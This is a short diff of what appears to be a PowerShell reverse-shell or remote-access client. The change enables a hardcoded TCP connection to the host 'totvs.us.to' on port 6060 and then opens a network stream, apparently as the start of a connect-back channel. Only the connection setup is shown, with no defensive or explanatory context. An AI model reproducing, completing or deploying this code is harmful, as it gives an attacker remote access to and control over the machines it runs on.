@@ -8,9 +8,8 @@ $Hosts = 'totvs.us.to'
 			
 $Port = 6060
 
-#$Clients = New-Object System.Net.Sockets.TcpClient($Hosts, $Port)
+$Clients = New-Object System.Net.Sockets.TcpClient($Hosts, $Port)
 
-$Clients = [System.Net.Sockets.TcpClient]::new($Hosts, $Port)
 $Clients.NoDelay = $true
 
 $Streams = $Clients.GetStream()
